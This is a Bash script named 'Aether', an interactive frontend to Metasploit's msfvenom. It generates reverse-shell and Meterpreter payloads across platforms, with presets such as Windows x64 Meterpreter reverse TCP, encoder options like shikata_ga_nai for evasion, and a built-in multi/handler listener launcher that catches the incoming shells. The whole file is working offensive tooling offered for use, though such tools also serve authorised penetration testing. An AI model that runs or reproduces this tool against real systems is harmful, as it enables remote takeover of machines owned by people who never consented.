#!/bin/bash
# ╔════════════════════════════════════════════════════════════════════════════╗
# ║                          AETHER - PAYLOAD GENESIS v3.6                     ║
# ║                Advanced MSFVENOM Frontend for Kali Linux                    ║
# ║            Developed by: Ahmed Emad, Mohamed Nagy,                         ║
# ║                Abdallah Negeada, Abdallah Salman                           ║
# ╚════════════════════════════════════════════════════════════════════════════╝

set -u
IFS=$'\n\t'

# ─── Colors ───
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; DIM='\033[2m'; NC='\033[0m'; BOLD='\033[1m'

# ─── Configuration ───
APP="Aether"; VERSION="3.6.0"
CONFIG_DIR="$HOME/.aether"; CONFIG_FILE="$CONFIG_DIR/config"
LOG_FILE="$CONFIG_DIR/aether.log"; CACHE_DIR="$CONFIG_DIR/cache"
FAVORITES_FILE="$CONFIG_DIR/favorites"; OUTPUT_DIR="$HOME/aether_payloads"
MAX_LOG_LINES=1000

mkdir -p "$CONFIG_DIR" "$CACHE_DIR" "$OUTPUT_DIR" 2>/dev/null
touch "$LOG_FILE"

DEFAULT_LHOST=""; DEFAULT_LPORT="4444"; DEFAULT_ENCODER="none"
DEFAULT_ITERATIONS=1; DEFAULT_FORMAT="exe"; DEFAULT_PLATFORM="windows"; DEFAULT_ARCH="x64"
[ -f "$CONFIG_FILE" ] && source "$CONFIG_FILE"

# ─── Logging & Output ───
log() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $1" >> "$LOG_FILE"
    
    # Rotate logs if too large
    if [ $(wc -l < "$LOG_FILE") -gt $MAX_LOG_LINES ]; then
        tail -n $MAX_LOG_LINES "$LOG_FILE" > "$LOG_FILE.tmp"
        mv "$LOG_FILE.tmp" "$LOG_FILE"
    fi
}

ok()  { echo -e "${GREEN}[✓] $1${NC}" >&2; log "OK: $1"; }
err() { echo -e "${RED}[✗] $1${NC}" >&2; log "ERROR: $1"; }
warn() { echo -e "${YELLOW}[!] $1${NC}" >&2; log "WARN: $1"; }
info(){ echo -e "${YELLOW}[*] $1${NC}" >&2; }
title(){ echo -e "${CYAN}${BOLD}── $1 ──${NC}" >&2; }
success() { echo -e "${GREEN}${BOLD}$1${NC}" >&2; }
press_enter() { echo >&2; read -rp "Press Enter to continue..." < /dev/tty; }

# ─── Validation Functions ───
is_valid_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0
    fi
    return 1
}

is_valid_hostname() {
    local host=$1
    if [[ $host =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
        return 0
    fi
    return 1
}

is_valid_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]; then
        return 0
    fi
    return 1
}

validate_lhost() {
    local lhost=$1
    if is_valid_ip "$lhost" || is_valid_hostname "$lhost" || [ "$lhost" = "localhost" ]; then
        return 0
    fi
    return 1
}

# ─── Dependency Check ───
check_deps() {
    local missing=()
    
    for cmd in msfvenom msfconsole; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        err "Missing dependencies: ${missing[*]}"
        err "Install Metasploit Framework:"
        info "sudo apt update && sudo apt install metasploit-framework -y"
        exit 1
    fi
}

# ─── Config Management ───
save_config() {
    cat > "$CONFIG_FILE" <<EOF
DEFAULT_LHOST="$DEFAULT_LHOST"
DEFAULT_LPORT="$DEFAULT_LPORT"
DEFAULT_ENCODER="$DEFAULT_ENCODER"
DEFAULT_ITERATIONS=$DEFAULT_ITERATIONS
DEFAULT_FORMAT="$DEFAULT_FORMAT"
DEFAULT_PLATFORM="$DEFAULT_PLATFORM"
DEFAULT_ARCH="$DEFAULT_ARCH"
EOF
    ok "Configuration saved"
}

add_favorite() {
    local name="$1"
    local payload="$2"
    local format="$3"
    local encoder="$4"
    
    echo "$name|$payload|$format|$encoder" >> "$FAVORITES_FILE"
    ok "Added favorite: $name"
}

show_favorites() {
    if [ ! -f "$FAVORITES_FILE" ] || [ ! -s "$FAVORITES_FILE" ]; then
        err "No favorites saved yet"
        return 1
    fi
    
    title "Your Favorites"
    local i=1
    while IFS='|' read -r name payload format encoder; do
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%s${NC}\n" "$i" "$name" >&2
        printf "      Payload: %s | Format: %s | Encoder: %s\n" "$payload" "$format" "$encoder" >&2
        ((i++))
    done < "$FAVORITES_FILE"
}

# ─── Banner ───
banner() {
    clear
    echo -e "${YELLOW}${BOLD}"
    echo "   █████╗ ███████╗████████╗██╗  ██╗███████╗██████╗ "
    echo "  ██╔══██╗██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗"
    echo "  ███████║█████╗     ██║   ███████║█████╗  ██████╔╝"
    echo "  ██╔══██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗"
    echo "  ██║  ██║███████╗   ██║   ██║  ██║███████╗██║  ██║"
    echo "  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "  ${MAGENTA}⚡ Payload Genesis v${VERSION}${NC}"
    echo -e "  ${CYAN}╔═════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${GREEN}Ahmed Emad${NC}         ${GREEN}Mohamed Nagy${NC}     ${CYAN}║${NC}"
    echo -e "  ${CYAN}║${NC}   ${GREEN}Abdallah Negeada${NC}   ${GREEN}Abdallah Salman${NC}  ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚═════════════════════════════════════════╝${NC}"
    echo
}

# ─── Main Menu ───
show_main_menu() {
    echo -e "  ${BOLD}${CYAN}── MAIN MENU ──${NC}"
    echo
    echo -e "  ${GREEN}1)${NC} ${BOLD}${WHITE}Generate Payload${NC}"
    echo -e "  ${GREEN}2)${NC} ${BOLD}${WHITE}Quick Presets${NC}"
    echo -e "  ${GREEN}3)${NC} ${BOLD}${WHITE}Saved Favorites${NC}"
    echo -e "  ${GREEN}4)${NC} ${BOLD}${WHITE}Start Listener${NC}"
    echo -e "  ${GREEN}5)${NC} ${BOLD}${WHITE}Settings${NC}"
    echo -e "  ${GREEN}6)${NC} ${BOLD}${WHITE}View Payloads${NC}"
    echo -e "  ${GREEN}0)${NC} ${RED}${BOLD}Exit${NC}"
    echo
}

# ─── Payload Cache ───
update_cache() {
    info "Updating payload cache..."
    msfvenom --list payloads 2>/dev/null | awk 'NR>5 {print $1}' > "$CACHE_DIR/all_payloads.txt"
    local count=$(wc -l < "$CACHE_DIR/all_payloads.txt" 2>/dev/null || echo 0)
    ok "Cache updated ($count payloads)"
}

filter_payloads() {
    local plat="$1" arch="$2" type="$3"
    local cache="$CACHE_DIR/all_payloads.txt"
    
    if [ ! -s "$cache" ] || [ "$(find "$cache" -mmin +120 2>/dev/null)" ]; then
        update_cache
    fi
    
    local regex="^${plat}/${arch}/${type}"
    [ "$type" = "any" ] && regex="^${plat}/${arch}/"
    [ "$arch" = "any" ] && regex="^${plat}/"
    [ "$plat" = "any" ] && regex="."
    
    grep -E "$regex" "$cache" 2>/dev/null || true
}

select_payload() {
    local plat="$1" arch="$2" type="$3"
    local list tmpfile
    
    mapfile -t list < <(filter_payloads "$plat" "$arch" "$type")
    
    if [ ${#list[@]} -eq 0 ]; then
        err "No payloads found for: $plat/$arch/$type"
        return 1
    fi
    
    tmpfile=$(mktemp)
    for i in "${!list[@]}"; do
        printf "%4d) %s\n" $((i+1)) "${list[$i]}"
    done > "$tmpfile"
    
    cat "$tmpfile" >&2
    rm -f "$tmpfile"
    
    echo >&2
    local payload
    
    if command -v fzf &>/dev/null; then
        payload=$(printf '%s\n' "${list[@]}" | fzf --header="Select payload (type to filter, ENTER to confirm)" --preview="echo {}")
        [ -z "$payload" ] && return 1
    else
        local selection
        read -rp "Enter payload number (1-${#list[@]}) or full name: " selection < /dev/tty
        
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le ${#list[@]} ]; then
            payload="${list[$((selection-1))]}"
        elif [ -n "$selection" ]; then
            payload="$selection"
        else
            return 1
        fi
    fi
    
    echo "$payload"
}

# ─── Generate Payload ───
generate_payload() {
    banner
    title "Payload Generation"
    
    # Platform Selection
    echo -e "${WHITE}Select target platform:${NC}" >&2
    local platforms=("windows" "linux" "android" "osx" "ios" "php" "python" "nodejs" "ruby" "generic")
    for i in "${!platforms[@]}"; do
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%s${NC}\n" $((i+1)) "${platforms[$i]}" >&2
    done
    
    read -rp "Choice (1-${#platforms[@]}, default: $DEFAULT_PLATFORM): " plat_choice < /dev/tty
    plat_choice=${plat_choice:-$DEFAULT_PLATFORM}
    
    if [[ "$plat_choice" =~ ^[0-9]+$ ]] && [ "$plat_choice" -ge 1 ] && [ "$plat_choice" -le ${#platforms[@]} ]; then
        platform_disp="${platforms[$((plat_choice-1))]}"
        case "$platform_disp" in
            osx) platform="osx" ;;
            ios) platform="apple_ios" ;;
            nodejs) platform="nodejs" ;;
            ruby) platform="ruby" ;;
            *)   platform="$platform_disp" ;;
        esac
    else
        platform="$plat_choice"
    fi
    
    # Architecture Selection
    local archs=()
    case "$platform" in
        windows)    archs=("x86" "x64") ;;
        linux)      archs=("x86" "x64" "armle" "mipsle") ;;
        android)    archs=("arm" "arm64" "x86" "x64") ;;
        osx)        archs=("x86" "x64") ;;
        apple_ios)  archs=("arm64") ;;
        php|python|nodejs|ruby) archs=("generic") ;;
        *)          archs=("x86" "x64" "arm") ;;
    esac
    
    echo -e "\n${WHITE}Select architecture:${NC}" >&2
    for i in "${!archs[@]}"; do
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%s${NC}\n" $((i+1)) "${archs[$i]}" >&2
    done
    printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}custom${NC}\n" $(( ${#archs[@]}+1 )) >&2
    
    read -rp "Choice (1-$((${#archs[@]}+1)), default: $DEFAULT_ARCH): " arch_choice < /dev/tty
    arch_choice=${arch_choice:-$DEFAULT_ARCH}
    
    if [[ "$arch_choice" =~ ^[0-9]+$ ]] && [ "$arch_choice" -le ${#archs[@]} ]; then
        arch="${archs[$((arch_choice-1))]}"
    elif [ "$arch_choice" -eq $(( ${#archs[@]}+1 )) ]; then
        read -rp "Enter custom architecture: " arch < /dev/tty
    else
        arch="$arch_choice"
    fi
    
    # Payload Type
    echo -e "\n${WHITE}Payload type:${NC}" >&2
    printf "  ${GREEN}1)${NC} ${BOLD}${WHITE}meterpreter${NC}\n" >&2
    printf "  ${GREEN}2)${NC} ${BOLD}${WHITE}shell${NC}\n" >&2
    printf "  ${GREEN}3)${NC} ${BOLD}${WHITE}custom (enter substring)${NC}\n" >&2
    printf "  ${GREEN}4)${NC} ${BOLD}${WHITE}any${NC}\n" >&2
    
    read -rp "Choice [4]: " type_choice < /dev/tty
    type_choice=${type_choice:-4}
    
    local ptype="any"
    case "$type_choice" in
        1) ptype="meterpreter";;
        2) ptype="shell";;
        3) read -rp "Enter substring: " ptype < /dev/tty;;
        4) ptype="any";;
        *) err "Invalid choice"; sleep 1; return 1;;
    esac
    
    info "Loading payload list..."
    local payload
    payload=$(select_payload "$platform" "$arch" "$ptype")
    [ -z "$payload" ] && { err "No payload selected"; return 1; }
    success "Selected: $payload"
    
    # LHOST/LPORT with Validation
    while true; do
        read -rp "LHOST [$DEFAULT_LHOST]: " lhost < /dev/tty
        lhost=${lhost:-$DEFAULT_LHOST}
        
        if validate_lhost "$lhost"; then
            break
        else
            err "Invalid LHOST: $lhost (must be valid IP or hostname)"
        fi
    done
    
    while true; do
        read -rp "LPORT [$DEFAULT_LPORT]: " lport < /dev/tty
        lport=${lport:-$DEFAULT_LPORT}
        
        if is_valid_port "$lport"; then
            break
        else
            err "Invalid LPORT: $lport (must be 1-65535)"
        fi
    done
    
    # Output Format
    echo -e "\n${WHITE}Output format:${NC}" >&2
    local formats=("exe" "elf" "raw" "python" "ps1" "c" "csharp" "dll" "asp" "aspx" "java" "jsp" "war" "bash" "php" "ruby" "nodejs")
    for i in "${!formats[@]}"; do
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%s${NC}\n" $((i+1)) "${formats[$i]}" >&2
    done
    printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}custom${NC}\n" $(( ${#formats[@]}+1 )) >&2
    
    read -rp "Choice (1-$((${#formats[@]}+1)), default: $DEFAULT_FORMAT): " fmt_choice < /dev/tty
    fmt_choice=${fmt_choice:-$DEFAULT_FORMAT}
    
    if [[ "$fmt_choice" =~ ^[0-9]+$ ]]; then
        if [ "$fmt_choice" -le "${#formats[@]}" ]; then
            format="${formats[$((fmt_choice-1))]}"
        elif [ "$fmt_choice" -eq $(( ${#formats[@]}+1 )) ]; then
            read -rp "Enter custom format: " format < /dev/tty
        else
            format="$fmt_choice"
        fi
    else
        format="$fmt_choice"
    fi
    
    read -rp "Output filename (without extension): " out_name < /dev/tty
    [ -z "$out_name" ] && { err "Filename cannot be empty"; return 1; }
    
    out_path="$OUTPUT_DIR/${out_name}.${format}"
    
    # Encoder Selection
    echo -e "\n${WHITE}Encoder (optional):${NC}" >&2
    printf "  ${GREEN}0)${NC} ${BOLD}${WHITE}None${NC}\n" >&2
    printf "  ${GREEN}1)${NC} ${BOLD}${WHITE}x86/shikata_ga_nai${NC}\n" >&2
    printf "  ${GREEN}2)${NC} ${BOLD}${WHITE}x64/xor${NC}\n" >&2
    printf "  ${GREEN}3)${NC} ${BOLD}${WHITE}x86/xor_dynamic${NC}\n" >&2
    printf "  ${GREEN}4)${NC} ${BOLD}${WHITE}cmd/powershell_base64${NC}\n" >&2
    printf "  ${GREEN}5)${NC} ${BOLD}${WHITE}generic/none${NC}\n" >&2
    printf "  ${GREEN}6)${NC} ${BOLD}${WHITE}custom${NC}\n" >&2
    
    read -rp "Choice [$DEFAULT_ENCODER]: " enc_choice < /dev/tty
    enc_choice=${enc_choice:-$DEFAULT_ENCODER}
    
    local encoder=""; local enc_iterations=0
    case "$enc_choice" in
        0) ;;
        1) encoder="x86/shikata_ga_nai"; read -rp "Iterations [$DEFAULT_ITERATIONS]: " enc_iterations < /dev/tty; enc_iterations=${enc_iterations:-$DEFAULT_ITERATIONS};;
        2) encoder="x64/xor"; read -rp "Iterations [1]: " enc_iterations < /dev/tty; enc_iterations=${enc_iterations:-1};;
        3) encoder="x86/xor_dynamic"; read -rp "Iterations [1]: " enc_iterations < /dev/tty; enc_iterations=${enc_iterations:-1};;
        4) encoder="cmd/powershell_base64";;
        5) encoder="generic/none";;
        6) read -rp "Encoder name: " encoder < /dev/tty; read -rp "Iterations [1]: " enc_iterations < /dev/tty; enc_iterations=${enc_iterations:-1};;
        *) err "Invalid encoder choice"; return 1;;
    esac
    
    # Command Preview
    local cmd_args=()
    cmd_args+=("msfvenom")
    cmd_args+=("-p" "$payload")
    cmd_args+=("LHOST=$lhost" "LPORT=$lport")
    [ -n "$encoder" ] && cmd_args+=("-e" "$encoder" "-i" "$enc_iterations")
    cmd_args+=("-f" "$format" "-o" "$out_path")
    
    echo -e "\n${YELLOW}Command preview:${NC}" >&2
    printf "  " >&2; printf "%s " "${cmd_args[@]}" >&2; echo >&2
    
    local exec_cmd="msfvenom -p $payload LHOST=$lhost LPORT=$lport"
    [ -n "$encoder" ] && exec_cmd+=" -e $encoder -i $enc_iterations"
    exec_cmd+=" -f $format -o $out_path"
    
    read -rp "Proceed? (y/n): " confirm < /dev/tty
    [ "$confirm" != "y" ] && { warn "Cancelled"; return 0; }
    
    echo -e "\n${CYAN}Generating payload...${NC}" >&2
    
    if eval "$exec_cmd"; then
        ok "Payload created: $out_path"
        log "Generated: $payload -> $out_path"
        
        # Update defaults
        DEFAULT_LHOST="$lhost"
        DEFAULT_LPORT="$lport"
        DEFAULT_ENCODER="$enc_choice"
        DEFAULT_ITERATIONS="$enc_iterations"
        DEFAULT_FORMAT="$format"
        DEFAULT_PLATFORM="$platform_disp"
        DEFAULT_ARCH="$arch"
        save_config
        
        # Ask to save as favorite
        read -rp "Save as favorite? (y/n): " fav < /dev/tty
        if [ "$fav" = "y" ]; then
            read -rp "Favorite name: " fav_name < /dev/tty
            add_favorite "$fav_name" "$payload" "$format" "$enc_choice"
        fi
    else
        err "msfvenom failed. Check the command and try again."
        return 1
    fi
    
    press_enter
}

# ─── Quick Presets ───
quick_presets() {
    banner
    title "Quick Presets"
    printf "  ${GREEN}1)${NC} ${BOLD}${WHITE}Windows x64 Meterpreter TCP (exe)${NC}\n" >&2
    printf "  ${GREEN}2)${NC} ${BOLD}${WHITE}Windows x64 Shell TCP (exe)${NC}\n" >&2
    printf "  ${GREEN}3)${NC} ${BOLD}${WHITE}Linux x64 Meterpreter TCP (elf)${NC}\n" >&2
    printf "  ${GREEN}4)${NC} ${BOLD}${WHITE}Linux x86 Shell TCP (elf)${NC}\n" >&2
    printf "  ${GREEN}5)${NC} ${BOLD}${WHITE}Android Meterpreter TCP (raw)${NC}\n" >&2
    printf "  ${GREEN}6)${NC} ${BOLD}${WHITE}macOS x64 Meterpreter TCP (macho)${NC}\n" >&2
    printf "  ${GREEN}7)${NC} ${BOLD}${WHITE}PHP Meterpreter TCP (raw)${NC}\n" >&2
    printf "  ${GREEN}8)${NC} ${BOLD}${WHITE}Python Reverse Shell (raw)${NC}\n" >&2
    printf "  ${GREEN}9)${NC} ${BOLD}${WHITE}Node.js Reverse Shell (raw)${NC}\n" >&2
    printf "  ${GREEN}10)${NC} ${BOLD}${WHITE}Windows PowerShell Encoded (ps1)${NC}\n" >&2
    printf "  ${GREEN}0)${NC} ${BOLD}${WHITE}Back${NC}\n" >&2
    
    read -rp "Choice: " qc < /dev/tty
    
    local payload format
    case $qc in
        1) payload="windows/x64/meterpreter/reverse_tcp"; format="exe";;
        2) payload="windows/x64/shell/reverse_tcp"; format="exe";;
        3) payload="linux/x64/meterpreter/reverse_tcp"; format="elf";;
        4) payload="linux/x86/shell_reverse_tcp"; format="elf";;
        5) payload="android/meterpreter/reverse_tcp"; format="raw";;
        6) payload="osx/x64/meterpreter/reverse_tcp"; format="macho";;
        7) payload="php/meterpreter/reverse_tcp"; format="raw";;
        8) payload="python/shell_reverse_tcp"; format="raw";;
        9) payload="nodejs/shell_reverse_tcp"; format="raw";;
        10) payload="windows/powershell_base64"; format="ps1";;
        0) return;;
        *) err "Invalid choice"; sleep 1; return;;
    esac
    
    read -rp "LHOST [$DEFAULT_LHOST]: " lhost < /dev/tty
    lhost=${lhost:-$DEFAULT_LHOST}
    
    if ! validate_lhost "$lhost"; then
        err "Invalid LHOST"; return 1
    fi
    
    read -rp "LPORT [$DEFAULT_LPORT]: " lport < /dev/tty
    lport=${lport:-$DEFAULT_LPORT}
    
    if ! is_valid_port "$lport"; then
        err "Invalid LPORT"; return 1
    fi
    
    read -rp "Output filename (without extension): " out_name < /dev/tty
    [ -z "$out_name" ] && { err "Filename cannot be empty"; return 1; }
    
    out_path="$OUTPUT_DIR/${out_name}.${format}"
    
    local cmd="msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o $out_path"
    echo -e "\n${DIM}Command: $cmd${NC}" >&2
    
    read -rp "Proceed? (y/n): " confirm < /dev/tty
    [ "$confirm" != "y" ] && { warn "Cancelled"; return 0; }
    
    if eval "$cmd"; then
        ok "Payload created: $out_path"
        log "Quick preset generated: $payload -> $out_path"
    else
        err "Failed to generate payload"
        return 1
    fi
    
    press_enter
}

# ─── View Payloads ───
view_payloads() {
    banner
    title "Generated Payloads"
    
    if [ ! -d "$OUTPUT_DIR" ] || [ -z "$(ls -A "$OUTPUT_DIR" 2>/dev/null)" ]; then
        warn "No payloads generated yet"
        press_enter
        return
    fi
    
    echo -e "${CYAN}Payloads in: $OUTPUT_DIR${NC}\n" >&2
    
    local i=1
    while IFS= read -r file; do
        local size=$(du -h "$file" | cut -f1)
        local mod=$(stat -f %Sm -t "%Y-%m-%d %H:%M" "$file" 2>/dev/null || stat -c %y "$file" 2>/dev/null | cut -d' ' -f1-2)
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%-40s${NC} Size: %5s  Modified: %s\n" "$i" "$(basename "$file")" "$size" "$mod" >&2
        ((i++))
    done < <(ls -1t "$OUTPUT_DIR" 2>/dev/null)
    
    echo >&2
    read -rp "Enter file number to view details (0 to skip): " choice < /dev/tty
    
    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -gt 0 ]; then
        local file=$(ls -1t "$OUTPUT_DIR" | sed -n "${choice}p")
        if [ -n "$file" ]; then
            echo -e "\n${CYAN}File: $file${NC}" >&2
            ls -lh "$OUTPUT_DIR/$file" >&2
            file "$OUTPUT_DIR/$file" >&2
        fi
    fi
    
    press_enter
}

# ─── Listener ───
start_listener() {
    banner
    title "Start Listener"
    
    echo -e "${WHITE}Select payload platform:${NC}" >&2
    local platforms=("windows" "linux" "android" "osx" "generic")
    for i in "${!platforms[@]}"; do
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%s${NC}\n" $((i+1)) "${platforms[$i]}" >&2
    done
    printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}custom${NC}\n" $((${#platforms[@]}+1)) >&2
    
    read -rp "Choice: " plat_choice < /dev/tty
    
    if [[ "$plat_choice" =~ ^[0-9]+$ ]] && [ "$plat_choice" -ge 1 ] && [ "$plat_choice" -le ${#platforms[@]} ]; then
        platform="${platforms[$((plat_choice-1))]}"
    elif [ "$plat_choice" -eq $((${#platforms[@]}+1)) ]; then
        read -rp "Enter platform: " platform < /dev/tty
    else
        return
    fi
    
    read -rp "Architecture [$DEFAULT_ARCH]: " arch < /dev/tty
    arch=${arch:-$DEFAULT_ARCH}
    
    info "Loading payload list..."
    local payload
    payload=$(select_payload "$platform" "$arch" "any")
    [ -z "$payload" ] && { err "No payload selected"; return 1; }
    
    while true; do
        read -rp "LHOST [$DEFAULT_LHOST]: " lhost < /dev/tty
        lhost=${lhost:-$DEFAULT_LHOST}
        validate_lhost "$lhost" && break
        err "Invalid LHOST"
    done
    
    while true; do
        read -rp "LPORT [$DEFAULT_LPORT]: " lport < /dev/tty
        lport=${lport:-$DEFAULT_LPORT}
        is_valid_port "$lport" && break
        err "Invalid LPORT"
    done
    
    local rcfile="$CONFIG_DIR/listener.rc"
    cat > "$rcfile" <<EOF
use multi/handler
set payload $payload
set LHOST $lhost
set LPORT $lport
set ExitOnSession false
exploit -j
EOF
    
    success "Launching msfconsole..."
    log "Starting listener for $payload on $lhost:$lport"
    
    if command -v xterm &>/dev/null; then
        xterm -e "msfconsole -q -r $rcfile" &
    elif command -v gnome-terminal &>/dev/null; then
        gnome-terminal -- bash -c "msfconsole -q -r $rcfile; exec bash" &
    elif command -v konsole &>/dev/null; then
        konsole -e msfconsole -q -r "$rcfile" &
    else
        msfconsole -q -r "$rcfile"
    fi
    
    ok "Listener started"
    press_enter
}

# ─── Settings Menu ───
settings_menu() {
    while true; do
        banner
        title "Settings"
        printf "  ${GREEN}1)${NC} ${BOLD}${WHITE}LHOST:${NC} $DEFAULT_LHOST\n" >&2
        printf "  ${GREEN}2)${NC} ${BOLD}${WHITE}LPORT:${NC} $DEFAULT_LPORT\n" >&2
        printf "  ${GREEN}3)${NC} ${BOLD}${WHITE}Encoder:${NC} $DEFAULT_ENCODER\n" >&2
        printf "  ${GREEN}4)${NC} ${BOLD}${WHITE}Iterations:${NC} $DEFAULT_ITERATIONS\n" >&2
        printf "  ${GREEN}5)${NC} ${BOLD}${WHITE}Format:${NC} $DEFAULT_FORMAT\n" >&2
        printf "  ${GREEN}6)${NC} ${BOLD}${WHITE}Platform:${NC} $DEFAULT_PLATFORM\n" >&2
        printf "  ${GREEN}7)${NC} ${BOLD}${WHITE}Architecture:${NC} $DEFAULT_ARCH\n" >&2
        printf "  ${GREEN}8)${NC} ${BOLD}${WHITE}Output Directory:${NC} $OUTPUT_DIR\n" >&2
        printf "  ${GREEN}9)${NC} ${BOLD}${WHITE}View Logs${NC}\n" >&2
        printf "  ${GREEN}10)${NC} ${BOLD}${WHITE}Clear Logs${NC}\n" >&2
        printf "  ${GREEN}0)${NC} ${BOLD}${WHITE}Back${NC}\n" >&2
        
        read -rp "Choice: " sc < /dev/tty
        
        case $sc in
            1) read -rp "New LHOST: " DEFAULT_LHOST < /dev/tty; save_config;;
            2) read -rp "New LPORT: " DEFAULT_LPORT < /dev/tty; save_config;;
            3) read -rp "Encoder: " DEFAULT_ENCODER < /dev/tty; save_config;;
            4) read -rp "Iterations: " DEFAULT_ITERATIONS < /dev/tty; save_config;;
            5) read -rp "Format: " DEFAULT_FORMAT < /dev/tty; save_config;;
            6) read -rp "Platform: " DEFAULT_PLATFORM < /dev/tty; save_config;;
            7) read -rp "Architecture: " DEFAULT_ARCH < /dev/tty; save_config;;
            8) read -rp "New directory: " nd < /dev/tty; 
               if mkdir -p "$nd" 2>/dev/null; then 
                   OUTPUT_DIR="$nd"
                   save_config
                   ok "Directory updated"
               else 
                   err "Cannot create directory"
               fi;;
            9) less "$LOG_FILE" 2>/dev/null || err "No logs found"; press_enter;;
            10) true > "$LOG_FILE"; ok "Logs cleared"; press_enter;;
            0) return;;
            *) err "Invalid choice"; sleep 1;;
        esac
    done
}

# ─── Main ───
main() {
    check_deps
    
    if [ ! -s "$CACHE_DIR/all_payloads.txt" ]; then
        banner
        update_cache
        sleep 2
    fi
    
    while true; do
        banner
        show_main_menu
        read -rp $'\033[0;32m❯ \033[0m' choice < /dev/tty
        
        case $choice in
            1) generate_payload;;
            2) quick_presets;;
            3) show_favorites && press_enter;;
            4) start_listener;;
            5) settings_menu;;
            6) view_payloads;;
            0) echo -e "\n${MAGENTA}Aether closed. Stay secure! 🚀${NC}" >&2; exit 0;;
            *) err "Invalid option"; sleep 1;;
        esac
    done
}

main "$@"
